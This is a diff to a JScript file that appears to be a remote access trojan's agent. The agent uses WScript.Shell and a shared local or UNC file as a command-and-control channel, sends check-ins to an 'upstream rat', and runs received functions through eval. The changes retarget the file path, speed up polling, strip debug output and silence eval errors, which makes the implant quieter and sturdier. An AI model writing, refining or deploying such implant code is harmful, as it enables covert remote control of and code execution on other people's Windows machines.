@@ -1,6 +1,6 @@
 //Define variables
-var home = 'C:\\users\\kclark\\desktop\\test.txt' // UNC or local path. Send and receive data through this file
-var sleepytime = 6000 //in milliseconds
+var home = 'C:\\users\\localadmin\\desktop\\test.txt' // UNC or local path. Send and receive data through this file
+var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
@@ -37,8 +37,6 @@ function smb_post(home, response) {
 
   if(updata !== checkin+"\r\n") { // Windows adds a \r\n at the end of file reads
     var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
-//    WScript.Echo("smb: Downstream Recieved: " + updata)
-//    WScript.Echo("smb: Downstream Sending: " + response)
     fdw.WriteLine(response)
     fdw.close()
     return updata.split("\r")[0]
@@ -131,7 +129,6 @@ while(true)
   //{
     var retval = ""
     var recv_package = false
-    //WScript.Echo("smb: sending checkin: "+checkin)
     var jsondata = smb_post(home, checkin);
     //WScript.Echo("smb: got jsondata frm srv: "+jsondata)
     if(!jsondata) { // if no message from upstream rat, just wait and try again
@@ -145,7 +142,11 @@ while(true)
     // Supports running extra functions once per loop ... right before checking for cmnd
     if(runextra) {
       for(var i in extrafunc) {
-        eval(extrafunc[i])
+        try {
+          eval(extrafunc[i])
+        }
+        catch (e) {
+        }
       }
     }
 
